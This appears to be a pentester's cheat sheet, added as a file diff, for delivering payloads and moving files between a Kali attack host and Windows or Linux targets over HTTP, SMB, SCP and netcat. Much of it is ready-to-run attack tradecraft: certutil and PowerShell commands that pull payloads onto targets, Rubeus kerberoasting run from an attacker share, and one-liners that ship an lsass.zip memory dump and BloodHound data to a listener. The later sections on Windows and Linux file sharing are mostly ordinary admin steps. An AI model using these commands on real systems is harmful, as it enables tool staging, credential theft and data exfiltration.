@@ -1,0 +1,165 @@
+Delivery of Payload 
+Transfering File
+===============================================================================================
+		M1.  HTTP Transfer - Linux as HTTP server
+		# On Server Host (Your Kali) SENDER
+		$ python3 -m http.server 8080           # Linux/Window with Python
+		# Transfer Payload Window -> Kali
+        $ sudo nc -lvnp 8080 > payload.exe    # On Kali (start HTTP listener) | # -l: Listen | -v: Verbose | -p: Port | -n: No DNS resolution
+        PS:> $wc = New-Object System.Net.WebClient    # On Windows (send/Upload the file) 
+        PS:> $wc.UploadFile("http://<kali-ip>:8080", "C:\Path\To\payload.exe")    # On Windows (send/Upload the file) | This Method writes POST info metadata to the payload, only good to deliver text file.
+        PS:> $wc.UploadString("http://<kali-ip>:8080", [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Path\To\payload.exe")))    # On Windows (send/Upload the file) | This Method encode to base64 but still add Metadata to payload
+        		# On Client Host (Target) RECEIVER
+        		PS:> (New-Object Net.WebClient).DownloadFile('http://<Server_IP>:8080/payload.exe', 'C:\Users\Public\Payload.exe')		# Window Client - Works
+		PS:> Invoke-WebRequest -Uri "http://<Server_ip>:8080/payload.exe" -OutFile "C:\Users\Public\payload.exe"       # Window Client - Works
+		PS:> iwr -Uri "http://10.10.14.22:8080/chisel_1.7.7_windows_amd64" -OutFile "C:\Tools\chisel.exe"
+		OR
+		> certutil -urlcache -split -f http://<Server_ip>:8080/payload.exe C:\OutPut\Path\payload.exe     # Window Client | -split download in chunks | -f 	force overwrite - Works
+		OR
+		$ curl http://<server_ip>:<port>/payload.bin -o payload.bin    # Linux Client
+		$ wget http://<server_ip>:<port>/payload.bin -O payload.bin    # Linux Client
+===============================================================================================		
+		M2. SMB Share (No Disk Write on Target) - Linux as SMB server
+		# On Server Host (Your Kali) SENDER
+$ sudo impacket-smbserver <share_name> /path/to/payload.exe -smb2support   # Kali Linux 
+> New-SmbShare -Name "Share_Name" -Path "payload" -FullAccess Everyone    # Window
+> Get-SmbShare | Select-Object Name, Path    # List current Shares
+> Remove-SmbShare -Name "Share_Name"    # Delete Shares
+		# On Client Host (Target) RECEIVER
+PS:> Get-ChildItem \\<server_ip>\share_name    # Test access
+PS:> Invoke-WebRequest -Uri "\\<server_ip>\<share_name>\payload" -OutFile "$env:USERPROFILE\Desktop\payload"
+> certutil -urlcache -split -f "\\<server_ip>\<share_name>\payload" C:\Users\Administrator\Desktop\payload
+PS:>cmd.exe /c "\\<server_ip>\share_name\Rubeus.exe kerberoast"
+PS:> Start-Process "\\<server_ip>\share_name\Rubeus.exe" -ArgumentList "kerberoast"
+> copy \\<server_ip>\share_name\payload.exe C:\Users\Public\payload.exe    # Window
+> Copy-Item "\\<Server_IP>\share_name\Rubeus.exe" -Destination "C:\Path\To\Rubeus.exe" .\C:\\Path\To\Rubeus.exe kerberoast
+$ smbclient //server_ip/share_name -U guest -c 'get payload.exe'    # Linux
+Share_name Eg : C$, ADMIN$, IPC$
+===============================================================================================
+		M3. SCP copy through SSH
+		$ sudo scp <Payload> <user>@<Dest_IP>:<Drop_Location>    # Run on Kali to Copy payload from Window -> Kali
+		$ scp cme-ubuntu-latest-3.8.zip htb-student@10.129.123.50:~
+		
+===============================================================================================
+M4. Powershell Native (Windows) -> Netcat Listener (Linux)
+# On Receiver(Linux)
+$ nc -lnvp 8081 > <BloodHound.zip>
+# On Sender(Windows)
+Powershell
+$client = New-Object System.Net.Sockets.TcpClient("<Receiver_IP>", 8081)
+$stream = $client.GetStream()
+$bytes = [System.IO.File]::ReadAllBytes("C:\Users\Public\Bloodhound.zip")
+$stream.Write($bytes, 0, $bytes.Length)
+$stream.Close()
+$client.Close()
+OR, 1-liner
+PS> $client=New-Object System.Net.Sockets.TcpClient("<Receiver_IP>",8081);$stream=$client.GetStream();$bytes=[System.IO.File]::ReadAllBytes("C:\Users\Public\Bloodhound.zip");$stream.Write($bytes,0,$bytes.Length);$stream.Close();$client.Close()
+cmd> powershell -ExecutionPolicy Bypass -Command "$client=New-Object System.Net.Sockets.TcpClient('<Receiver IP>',8080);$stream=$client.GetStream();$bytes=[System.IO.File]::ReadAllBytes('C:\lsass.zip');$stream.Write($bytes,0,$bytes.Length);$stream.Close();$client.Close()"
+cmd> curl --upload-file C:\lsass.zip http://<Receiver IP>:8080/
+
+
+
+===============================================================================================
+✅ How to actually download a whole folder 
+
+Linux ↔ Linux
+Option 1 — Download a compressed archive (recommended)
+If you control the server, compress the folder first:
+On the server:
+$ tar -czf folder.tar.gz folder/
+
+On your machine:
+$ curl http://<server_ip>:<port>/folder.tar.gz -o folder.tar.gz
+$ tar -xzf folder.tar.gz
+This is the cleanest and most reliable method.
+
+
+Option 2 — Use wget with recursive download
+If the server exposes directory listings:
+$ wget -r http://<server_ip>:<port>/folder/
+wget supports recursion; curl does not.
+
+Windows ↔ Linux
+PS> Compress-Archive -Path C:\path\to\folder -DestinationPath C:\path\to\folder.zip
+cmd> tar -a -c -f C:\path\to\folder.zip C:\path\to\folder
+Transfer Payload Window -> Kali
+Kali $ sudo nc -lvnp 8080 > folder.zip
+Windows PS:> (New-Object Net.WebClient).UploadFile("http://<kali-ip>:8080", "C:\Path\To\folder.zip")
+Or
+Set up Server on Windows, Then download it with curl:
+$ curl http://<server_ip>:<port>/folder.zip -o folder.zip
+$ wget -r http://<server_ip>:<port>/folder/
+
+
+
+===============================================================================================
+File Transfer with Native Tools (Windows ↔ Linux through SMB) - Windows as SMB Server
+from an AD object/SPN perspective, cifs/ is the SMB service.
+🟦 PART 1 — Windows as SMB Server (native)
+✔ Step 1 — Create a folder to share
+Run in Windows CMD:
+cmd> mkdir C:\Users\student\Desktop\testshare
+✔ Step 2 — Share the folder (native command)
+cmd> net.exe share <ShareName>=<PathToShareFolder> /grant:Everyone,FULL
+cmd> C:\Users\student\Desktop>C:\Windows\System32\net.exe share share=C:\Users\student\Desktop\testshare /grant:Everyone,FULL
+share was shared successfully.
+This creates a share name “share”: (\\<Windows-IP>\share)
+Eg: \\192.168.31.138\share
+# Verify the Share exist
+PS > net share
+# Remove the share
+PS> Remove-SmbShare -Name "share"
+
+🟩 PART 2 — Linux as SMB Client (native kernel CIFS)
+Linux does not need Samba installed to mount an SMB share. The CIFS client is built into the kernel.
+✔ Step 1 — Create mount point
+$ sudo mkdir -p /mnt/win
+✔ Step 2 — Mount the Windows share
+$ sudo mount -t cifs //<Windows IP>/share /mnt/win -o username=USERNAME,password=PASSWORD
+┌──(kali㉿kali)-[/mnt]
+└─$ sudo mount -t cifs //192.168.31.138/share /mnt/win -o username=student,password=student,vers=3.0,sec=ntlmssp
+• vers=3.0 Forces SMB protocol version 3.0. This is important because:
+Windows 10/11 and Server 2016+ default to SMB3
+SMB1 is disabled by default on modern Windows
+Negotiation sometimes fails unless you explicitly specify a version
+• sec=ntlmssp Forces NTLMSSP authentication. This is the correct choice for modern Windows hosts unless you’ve configured Kerberos or AD integration.
+• mount -t cifs = Tells Linux to mount a Windows/SMB share using the CIFS driver.
+• //192.168.31.138/share = UNC path to the SMB share you created with net share.
+• /mnt/win = Local mount point on the Linux system.
+• -o username=student,password=student = Credentials passed directly in the options string. (Works for labs; in production you’d use a credentials file.)
+Now Linux sees the Windows folder at:
+/mnt/win
+
+🟨 PART 3 — Linux → Windows file transfer
+Now that the share is mounted:
+$ cp file.txt /mnt/win/
+That’s it — file lands in:
+C:\Users\student\Desktop\testshare
+
+
+🟧 PART 4 — Windows → Linux file transfer
+Since Linux mounted the Windows share, Windows can also push files into it.
+On Windows:
+cmd> C:\Users\student\Desktop>copy C:\Users\student\Desktop\file.txt \\192.168.31.138\share\
+        1 file(s) copied.
+Linux will see it appear in:
+/mnt/win/file.txt
+ Cleanup - Unmount (Linux)
+┌──(kali㉿kali)-[/mnt]
+└─$ sudo umount /mnt/win
+
+
+🟧 PART 5 — Windows(SMBServer) → Windows file transfer
+Try to "map" the connection with the credentials explicitly to S Drive. Run this on the machine where you want to receive the file:
+PS> $pass = ConvertTo-SecureString "PasswordToSMBServerBox" -AsPlainText -Force
+PS> $cred = New-Object System.Management.Automation.PSCredential("<DomainNameOfSMBServerBox>\Administrator", $pass)
+# Connect to the share explicitly using the credentials
+PS> New-PSDrive -Name "S" -PSProvider FileSystem -Root "\\172.16.118.252\share" -Credential $cred
+# Once that drive is mapped, you can just copy the File from SMBServer → Your Window Box:
+PS> Copy-Item "S:\20260219225438_BloodHound.zip" -Destination "C:\Tools\"
+
+
+
+
+
+
